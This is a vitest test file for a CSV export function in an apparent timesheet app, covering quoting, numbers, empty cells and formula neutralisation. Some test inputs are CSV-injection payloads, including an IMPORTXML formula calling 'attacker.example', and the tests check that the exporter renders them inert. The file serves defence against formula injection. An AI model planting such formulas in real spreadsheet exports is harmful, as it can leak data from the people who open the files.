import { describe, expect, it } from "vitest";

import { toCsv } from "./csv";

describe("csv generation", () => {
  it("writes a header row and one line per record", () => {
    const csv = toCsv(
      ["a", "b"],
      [
        ["1", "2"],
        ["3", "4"],
      ],
    );
    expect(csv).toBe("a,b\r\n1,2\r\n3,4");
  });

  it("quotes fields containing a comma, quote or newline", () => {
    expect(toCsv(["x"], [["a,b"]])).toBe('x\r\n"a,b"');
    expect(toCsv(["x"], [['say "hi"']])).toBe('x\r\n"say ""hi"""');
    expect(toCsv(["x"], [["line1\nline2"]])).toBe('x\r\n"line1\nline2"');
  });

  it("leaves ordinary values unquoted", () => {
    expect(toCsv(["x"], [["plain"]])).toBe("x\r\nplain");
  });

  it("neutralises formulas so a download cannot execute on open", () => {
    // The apostrophe forces the cell to be read as text.
    expect(toCsv(["x"], [["=1+1"]])).toBe("x\r\n'=1+1");
    expect(toCsv(["x"], [["@SUM(A1)"]])).toBe("x\r\n'@SUM(A1)");
    expect(toCsv(["x"], [['=HYPERLINK("http://x","c")']])).toBe(
      `x\r\n"'=HYPERLINK(""http://x"",""c"")"`,
    );
  });

  it("writes numbers unquoted so spreadsheets can sum them", () => {
    expect(toCsv(["hours"], [[7.25]])).toBe("hours\r\n7.25");
    expect(toCsv(["hours"], [[0]])).toBe("hours\r\n0");
  });

  it("renders null and undefined as empty cells", () => {
    expect(toCsv(["a", "b"], [[null, undefined]])).toBe("a,b\r\n,");
  });
});

describe("a real exported week", () => {
  /** The exact rows the database returned for the seeded test week. */
  const HEADERS = [
    "work_date",
    "employee_name",
    "client_name",
    "service_name",
    "hours",
    "billing_type",
    "notes",
  ] as const;

  it("renders safely, including a note containing a comma and a formula", () => {
    const csv = toCsv(HEADERS, [
      [
        "2026-08-24",
        "Noor Hussam",
        "MYF",
        "Copywriting",
        4.25,
        "Billable",
        "Normal note, with a comma",
      ],
      [
        "2026-08-25",
        "Noor Hussam",
        "MYF",
        "Copywriting",
        3.5,
        "Non-billable",
        '=IMPORTXML("http://attacker.example","//a")',
      ],
    ]);

    const lines = csv.split("\r\n");
    expect(lines[0]).toBe(
      "work_date,employee_name,client_name,service_name,hours,billing_type,notes",
    );

    // The comma inside the note must not split the row into extra columns.
    expect(lines[1]).toBe(
      '2026-08-24,Noor Hussam,MYF,Copywriting,4.25,Billable,"Normal note, with a comma"',
    );

    // The formula must be inert when the file is opened.
    expect(lines[2]).toContain(`"'=IMPORTXML(`);
    expect(lines[2]?.startsWith("2026-08-25,")).toBe(true);

    // Three records including the header, not four -- nothing split.
    expect(lines).toHaveLength(3);
  });
});
